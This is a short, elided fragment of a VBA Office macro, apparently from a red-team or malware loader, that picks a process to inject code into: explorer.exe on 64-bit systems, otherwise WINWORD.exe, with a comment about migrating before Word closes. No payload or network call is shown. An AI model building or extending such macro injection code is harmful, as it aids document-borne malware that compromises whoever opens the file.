...
Function mymacro()
    ...
    If Is64 Then
        ' our stable injection friend, explorer.exe
        injProc = "explorer.exe"
    ...
    Else
        ' Often times this is the only 32-bit process open. Migrate ASAP before Microsoft Word is closed
        injProc = "WINWORD.exe"
